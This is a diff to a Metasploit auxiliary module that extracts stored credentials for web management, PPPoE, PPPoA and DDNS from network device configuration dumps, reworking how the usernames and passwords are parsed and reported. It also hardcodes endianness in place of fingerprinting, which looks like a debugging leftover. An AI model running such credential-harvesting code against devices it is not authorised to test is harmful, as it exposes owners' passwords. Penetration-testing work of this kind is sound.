@@ -14,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
   SETTINGS = {
     'Creds' => [
       [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
-      [ 'HTTP Web Management', { 'user' => /login_username=(\S+)/i, 'pass' => /login_password=(\S+)/i } ],
+      [ 'HTTP Web Management Login', { 'user' => /login_username=(\S+)/i, 'pass' => /login_password=(\S+)/i } ],
       [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
       [ 'PPPoA', { 'user' => /pppoa_username=(\S+)/i, 'pass' => /pppoa_password=(\S+)/i } ],
       [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
@@ -33,6 +33,7 @@ class Metasploit3 < Msf::Auxiliary
   }
 
   attr_accessor :endianess
+  attr_accessor :credentials
 
   def initialize(info={})
     super(update_info(info,
@@ -63,7 +64,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     print_status("#{peer} - Attempting to connect and check endianess...")
-    @endianess = fingerprint_endian
+    #@endianess = fingerprint_endian
+    @endianess = 'BE'
+    @credentials = {}
 
     if endianess.nil?
       print_error("Failed to check endianess, aborting...")
@@ -191,8 +194,24 @@ class Metasploit3 < Msf::Auxiliary
 
     configs.each do |config|
       parse_general_config(config)
+      parse_auth_config(config)
     end
-    parse_auth_config(configs)
+
+    @credentials.each do |k,v|
+      next unless v[:user] and v[:password]
+      print_status("#{peer} - #{k}: User: #{v[:user]} Pass: #{v[:password]}")
+      auth = {
+          :host => rhost,
+          :port => rport,
+          :user => v[:user],
+          :pass => v[:password],
+          :type => 'password',
+          :source_type => "exploit",
+          :active => true
+      }
+      report_auth_info(auth)
+    end
+
   end
 
   def parse_general_config(config)
@@ -204,33 +223,17 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def parse_auth_config(configs)
+  def parse_auth_config(config)
     SETTINGS['Creds'].each do |cred|
-      user = nil
-      pass = nil
+      @credentials[cred[0]] = {} unless @credentials[cred[0]]
 
       # find the user/pass
-      u = configs.grep(cred[1]['user']) { $1 }
-      if u.any?
-        user = u[0]
-      end
-      p = configs.grep(cred[1]['pass']) { $1 }
-      if p.any?
-        pass = p[0]
+      if config.match(cred[1]['user'])
+        @credentials[cred[0]][:user] = $1
       end
 
-      if user and pass
-        print_status("#{peer} - #{cred[0]}: User: #{user} Pass: #{pass}")
-        auth = {
-          :host => rhost,
-          :port => rport,
-          :user => user,
-          :pass => pass,
-          :type => 'password',
-          :source_type => "exploit",
-          :active => true
-        }
-        report_auth_info(auth)
+      if config.match(cred[1]['pass'])
+        @credentials[cred[0]][:password] = $1
       end
 
     end
